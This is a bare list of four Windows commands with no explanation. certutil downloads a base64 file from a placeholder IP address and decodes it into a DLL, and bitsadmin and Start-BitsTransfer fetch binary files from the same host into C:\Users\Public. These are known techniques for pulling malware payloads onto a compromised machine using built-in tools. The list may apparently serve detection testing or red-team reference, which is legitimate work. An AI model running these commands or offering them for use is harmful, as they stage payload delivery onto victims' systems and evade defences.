certutil.exe -urlcache -split -f http://203.0.113.10/a.b64 C:\Users\Public\a.b64
certutil -decode C:\Users\Public\a.b64 C:\Users\Public\a.dll
bitsadmin.exe /transfer job /download /priority high http://203.0.113.10/b.bin C:\Users\Public\b.bin
Start-BitsTransfer -Source http://203.0.113.10/c.bin -Destination C:\Users\Public\c.bin
